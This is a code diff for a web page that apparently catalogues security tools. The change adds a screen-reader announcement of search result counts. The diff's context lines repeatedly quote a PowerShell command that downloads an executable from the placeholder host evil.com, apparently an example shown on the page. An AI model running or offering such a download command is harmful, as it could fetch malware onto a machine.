@@ -27,6 +27,7 @@
             <label for="searchInput" class="sr-only">Search Security Tools</label>
             <input type="text" id="searchInput" class="search-input" placeholder="Search tools, categories, or keywords... (Press '/')" aria-label="Search Security Tools">
             <button id="clearSearch" class="clear-button hidden" aria-label="Clear search" title="Clear search" type="button">✕</button>
+            <div id="searchAnnouncement" class="sr-only" aria-live="polite"></div>
         </div>
     </div>
 
@@ -332,6 +333,7 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
     const noResults = document.getElementById('noResults');
     const filterBtns = document.querySelectorAll('.filter-btn');
     const toolsGrid = document.getElementById('toolsGrid');
+    const searchAnnouncement = document.getElementById('searchAnnouncement');
     let currentCategory = 'all';
 
     function updateURL() {
@@ -354,6 +356,7 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         updateURL();
         searchTerm = searchTerm.toLowerCase();
         let hasResults = false;
+        let resultCount = 0;
 
         // Clear previous highlights
         SearchHighlight.clear(toolsGrid);
@@ -372,6 +375,7 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
             if (categoryMatch && searchMatch) {
                 card.classList.remove('hidden');
                 hasResults = true;
+                resultCount++;
             } else {
                 card.classList.add('hidden');
             }
@@ -402,6 +406,9 @@ Invoke-WebRequest -Uri "http://evil.com/file.exe" -OutFile "C:\Temp\file.exe"
         } else {
             clearBtn.classList.add('hidden');
         }
+
+        // Announce results
+        searchAnnouncement.textContent = hasResults ? resultCount + " tools found." : "No tools found.";
     }
 
     function setCategory(cat) {
